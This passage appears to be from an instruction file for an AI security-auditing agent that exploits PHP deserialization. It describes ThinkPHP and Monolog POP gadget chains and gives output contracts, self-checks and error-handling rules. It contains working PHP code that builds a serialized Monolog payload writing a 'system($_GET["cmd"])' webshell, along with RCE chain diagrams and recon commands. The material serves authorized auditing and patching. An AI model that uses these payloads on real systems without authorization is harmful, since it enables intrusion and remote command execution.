                                └─ $this->toJson()
                                     └─ ... → arbitrary function call
```

**Detection Rule:**
```bash
# Check ThinkPHP version
grep -r "topthink/framework\|topthink/think" $TARGET_PATH/composer.lock | grep version
# Check Model class
find $TARGET_PATH/vendor -name "Model.php" -path "*/think/*"
# Check Pivot subclass
find $TARGET_PATH/vendor -name "Pivot.php" -path "*/think/*"
# Detect unserialize entry points in the application
grep -rn "unserialize" $TARGET_PATH/app/ --include="*.php"
```

**Key Insight:**
> ThinkPHP's POP chain exploits the ORM Model's `__destruct()` → `save()` auto-persistence mechanism. The chain is long but very stable, because `Model::save()` triggers automatically on object destruction. The chain paths differ slightly between ThinkPHP 5.1 and 6.0; the specific version MUST be confirmed during auditing. This chain is especially common in Chinese PHP projects, as ThinkPHP is one of the most widely used PHP frameworks in China.

---

### 5. Monolog: BufferHandler → StreamHandler

| Property | Details |
|----------|---------|
| **Entry Class** | `Monolog\Handler\BufferHandler` |
| **Trigger Method** | `__destruct()` → `close()` |
| **Chain Flow** | `BufferHandler::__destruct()` → `$this->close()` → `$this->flush()` → `$this->handler->handle($record)` → `StreamHandler::handle()` → `StreamHandler::write()` → `fwrite($this->stream, $record)` |
| **Final Gadget** | `StreamHandler::write()` → `fwrite()` writes to arbitrary file (Webshell) |
| **Affected Versions** | Monolog 1.x – 3.x (phpggc: `Monolog/RCE1` ~ `Monolog/RCE8`) |

**Detailed Chain Flow:**

```
Monolog\Handler\BufferHandler::__destruct()
  └─ $this->close()
       └─ $this->flush()
            └─ foreach ($this->buffer as $record)
                 └─ $this->handler->handle($record)
                      │  handler = StreamHandler instance
                      └─ StreamHandler::write($record)
                           └─ fwrite($this->stream, $formatted)
                                │  stream = '/var/www/html/shell.php'
                                │  formatted = '<?php system($_GET["cmd"]); ?>'
                                └─ Webshell written ✓
```

**Monolog RCE Variant (using SyslogUdpHandler):**

```
BufferHandler::__destruct()
  └─ $this->close()
       └─ $this->flush()
            └─ $this->handler->handle($record)
                 │  handler = SyslogUdpHandler instance
                 └─ SyslogUdpHandler::write()
                      └─ $this->socket->write($msg)
                           │  socket property replaced with an object containing __call
                           └─ ... → eval() / system() → RCE
```

**Construction Code (File Write):**
```php
<?php
namespace Monolog\Handler {
    class StreamHandler {
        protected $url = '/var/www/html/shell.php';
        protected $level = 100;  // DEBUG level
    }
    class BufferHandler {
        protected $handler;
        protected $bufferSize = -1;
        protected $buffer = [];
        protected $level = 100;
        protected $initialized = true;
        protected $bufferLimit = -1;
        protected $processors = [];

        public function __construct($handler, $record) {
            $this->handler = $handler;
            $this->buffer = [$record];
        }
    }
}
namespace {
    $stream = new Monolog\Handler\StreamHandler();
    $record = [
        'message' => '<?php system($_GET["cmd"]); ?>',
        'level' => 100,
        'level_name' => 'DEBUG',
        'channel' => 'test',
        'datetime' => new DateTime(),
        'extra' => [],
        'context' => [],
        'formatted' => '<?php system($_GET["cmd"]); ?>',
    ];
    $payload = new Monolog\Handler\BufferHandler($stream, $record);
    echo serialize($payload);
}
```

**Detection Rule:**
```bash
# Check Monolog version
grep -r "monolog/monolog" $TARGET_PATH/composer.lock | grep version
# Check if BufferHandler exists
find $TARGET_PATH/vendor -name "BufferHandler.php" -path "*/Monolog/*"
# Check StreamHandler
find $TARGET_PATH/vendor -name "StreamHandler.php" -path "*/Monolog/*"
# phpggc available chains
phpggc -l Monolog
```

**Key Insight:**
> Monolog is present in nearly all modern PHP projects (the default logging library for Laravel, Symfony, and other frameworks), making it one of the most universal POP chains. The `BufferHandler` → `StreamHandler` chain achieves arbitrary file write (Webshell), while the `BufferHandler` → `SyslogUdpHandler` variant can achieve RCE. Since Monolog is an indirect dependency (introduced through frameworks), developers are often unaware of the deserialization risks it poses. During auditing, whenever `monolog/monolog` is found in `composer.lock`, it MUST be included in the POP chain search scope.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "deser_cookie_001",
  "final_verdict": "confirmed",
  "rounds_executed": 5,
  "successful_round": 3,
  "payload": "O:29:"Monolog\Handler\SyslogHandler":...",
  "evidence_result": "DESER_R3 written to /tmp/deser_proof_round_3 via Monolog gadget chain",
  "severity": {
    "level": "C",
    "score": 2.55,
    "cvss": 8.5
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.55 → cvss 8.5 → level `C`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "deser_cookie_001",
  "final_verdict": "suspected",
  "rounds_executed": 2,
  "successful_round": null,
  "payload": "O:8:"stdClass":0:{}",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "C",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no deserialization behavior observed
- failure_reason is empty — must explain why 'suspected' rather than confirmed
- severity_level 'C' for unconfirmed finding — suspected findings cannot be Critical

---

## Pre-Submission Self-Check (MUST be executed)

After completing the exploit JSON, perform item-by-item self-check per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); continue only after all are ✅
2. Execute the specialized checks below (S1-S3); submit only after all are ✅
3. Any item ❌ → correct and re-check; MUST NOT skip

### Specialized Self-Check (Deserialize Auditor Specific)
- [ ] S1: Deserialization entry points (unserialize/json_decode to __wakeup) have been annotated
- [ ] S2: Each gadget class and method in the POP chain has been listed
- [ ] S3: phar:// deserialization scenarios have been evaluated

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| No exploitable gadget chain found | Try alternative chains (Monolog, Guzzle, Laravel); if none available → record `"status": "no_gadget_chain"` |
| Phar wrapper disabled | Switch to direct `unserialize()` injection vector; if blocked → record `"phar_disabled": true` |
| Serialized payload rejected by type validation | Attempt type juggling or polymorphic payload; if rejected → record `"status": "type_enforced"` |
| Authentication token expired mid-attack | Re-fetch credentials from auth_credentials.json, retry current round |
